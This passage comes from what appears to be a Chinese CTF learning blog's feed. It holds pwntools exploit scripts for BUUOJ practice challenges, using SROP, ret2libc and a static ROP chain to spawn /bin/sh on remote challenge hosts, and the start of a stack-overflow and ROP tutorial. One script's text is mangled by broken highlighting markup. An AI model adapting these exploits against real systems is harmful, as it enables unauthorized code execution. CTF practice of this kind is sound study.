class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/smallest&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x4000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x4000B3，越过对rax寄存器的清零，使得rax寄存器值变为1</span></span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)  </span><br><span class="line"><span class="comment"># stack_addr = u64(c.recv()[8:16]) #接收接下要要部署的栈顶地址</span></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span> <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = <span class="number">59</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(execve)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(frame_payload))</span><br><span class="line"><span class="comment"># 将execve函数调用和/bin/sh字符串一起部署到栈中</span></span><br><span class="line">payload = frame_payload + (<span class="number">0x200</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26828</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(main_addr) * <span class="number">3</span></span><br><span class="line">c.send(payload1)</span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] stack_addr = &#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_read</span></span><br><span class="line">syscall = <span class="number">0x4000BE</span> </span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall</span><br><span class="line"></span><br><span class="line">payload2 = p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">payload3 = p64(syscall) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line">c.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_execve</span></span><br><span class="line"><span class="built_in">exec</span> = SigreturnFrame()                                                        </span><br><span class="line"><span class="built_in">exec</span>.rax = <span class="number">59</span></span><br><span class="line"><span class="built_in">exec</span>.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line"><span class="built_in">exec</span>.rsi = <span class="number">0</span>   </span><br><span class="line"><span class="built_in">exec</span>.rdx = <span class="number">0</span>                                                                   </span><br><span class="line"><span class="built_in">exec</span>.rsp = stack_addr                                  </span><br><span class="line"><span class="built_in">exec</span>.rip = syscall                                                         </span><br><span class="line">payload4 = (p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(<span class="built_in">exec</span>)).ljust(<span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">c.send(payload4)                                                                                                                               </span><br><span class="line">sleep(<span class="number">1</span>)   </span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">c.send(payload3)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x40-cmcc-pwnme1"><a href="#0x40-cmcc-pwnme1" class="headerlink" title="0x40.cmcc_pwnme1"></a>0x40.cmcc_pwnme1</h2><p><code>ret2libc3 &amp; recv() </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/67&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29880</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/67&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 0804a028</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 08048548</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 080486F4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recvline())</span><br><span class="line">puts_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(system_addr) + p32(main_addr) + p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.1tkvyskgoha8.webp"></p><h2 id="0x41-cmcc-pwnme2-why-libc3-can-not"><a href="#0x41-cmcc-pwnme2-why-libc3-can-not" class="headerlink" title="0x41.cmcc_pwnme2(why libc3 can not?)"></a>0x41.cmcc_pwnme2(why libc3 can not?)</h2><p><code>ROP &amp; little trick </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/68&quot;</span>)c<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">context.arch = &#x27;</span>i386<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exec_string_addr =0x080485cb</span></span><br><span class="line"><span class="string">string_addr = 0x0804a060</span></span><br><span class="line"><span class="string">gets_addr = elf.sym[&#x27;</span>gets<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c.recvuntil(&#x27;</span>Please <span class="built_in">input</span>:\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload= b&#x27;</span>a<span class="string">&#x27;*(0x6c+4)+ p32(gets_addr) + p32(exec_string_addr) + p32(string_addr)</span></span><br><span class="line"><span class="string">c.sendline(payload)</span></span><br><span class="line"><span class="string">c.sendline(b&#x27;</span>./flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">c.interactive()</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.2c52bu77hegw.webp"></p><p>​    没太搞懂为什么不能用<code>ret2libc3</code></p><h2 id="0x42-picoctf-2018-got-shell"><a href="#0x42-picoctf-2018-got-shell" class="headerlink" title="0x42.picoctf_2018_got_shell"></a>0x42.picoctf_2018_got_shell</h2><p><code>trick &amp; replace</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.35r8dvhlv79c.webp"></p><p>​    感觉<code>picoctf</code>出的题都很有脑洞的感觉。</p><p>​    <mark>got</mark>_shell !!!  第一反应应该是打got表而不是get_shell !</p><h2 id="0x43-picoctf-2018-can-you-gets-me"><a href="#0x43-picoctf-2018-can-you-gets-me" class="headerlink" title="0x43.picoctf_2018_can_you_gets_me"></a>0x43.picoctf_2018_can_you_gets_me</h2><p><code>静态链接 &amp; ret2libc3</code></p><blockquote><p>ROPgadget –binary 70 –ropchain</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/70&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25056</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1c</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;GIVE ME YOUR NAME!\n&#x27;</span>)</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 假期学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出漏洞</title>
      <link href="/2023/01/12/0_PWN/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/01/12/0_PWN/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Stack Overflow</p></blockquote><span id="more"></span><h1 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h1><h2 id="一、基本原理"><a href="#一、基本原理" class="headerlink" title="一、基本原理"></a>一、基本原理</h2><p>​    <strong>栈溢出</strong>指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是:</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h2 id="二、基本步骤"><a href="#二、基本步骤" class="headerlink" title="二、基本步骤"></a>二、基本步骤</h2><h3 id="1-寻找危险函数"><a href="#1-寻找危险函数" class="headerlink" title="1.寻找危险函数"></a>1.寻找危险函数</h3><p>​    通过寻找危险函数，我们可以快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下：</p><ul><li>输入<ul><li>gets，直接读取一行，忽略<code>斜杠0</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li> sprintf</li></ul></li><li>字符串<ul><li> strcpy，字符串复制，遇到’\x00’停止</li><li> strcat，字符串拼接，遇到’\x00’停止</li><li> bcopy</li></ul></li></ul><h3 id="2-确定填充长度"><a href="#2-确定填充长度" class="headerlink" title="2.确定填充长度"></a>2.确定填充长度</h3><p>​    这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式:</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><blockquote><p>补充：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.1tu8pm56pkcg.webp"></p></blockquote><h2 id="三、基本ROP"><a href="#三、基本ROP" class="headerlink" title="三、基本ROP"></a>三、基本ROP</h2><h3 id="1-介绍及原理"><a href="#1-介绍及原理" class="headerlink" title="1.介绍及原理"></a>1.介绍及原理</h3><p>​    随着 NX 保护（不可执行保护）的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 <strong>ROP(Return Oriented Programming)<strong>，其主要思想是在</strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 <strong>gadgets 就是以 ret 结尾的指令序列</strong>，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>​    之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>​    如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><p>​    —&gt;<strong>pwndbg动态调试</strong></p><h3 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h3><p>​    <strong>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</strong>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>​    这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭保护机制</span><br><span class="line">gcc -m32 -fno-stack-protector -no-pie -o ret2text ret2text.c</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4oru3ve9dmrk.webp"></p><p>​    编译生成后，我们可以发现：编译器提醒我们gets这个危险函数。可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。主函数中使用了 gets 函数，显然存在栈溢出漏洞。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.31k6t2djooqo.webp"></p><p>​    经过审阅，我们发现了secure函数：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4o53a41o13wg.webp"></p><h4 id="方法一：ida静态调试寻址"><a href="#方法一：ida静态调试寻址" class="headerlink" title="方法一：ida静态调试寻址"></a>方法一：ida静态调试寻址</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.2u018to3gvcw.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.3erkn06nnqps.webp"></p><p>构造payload如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    c2yb8er = process(<span class="string">&quot;ret2text&quot;</span>)  </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span 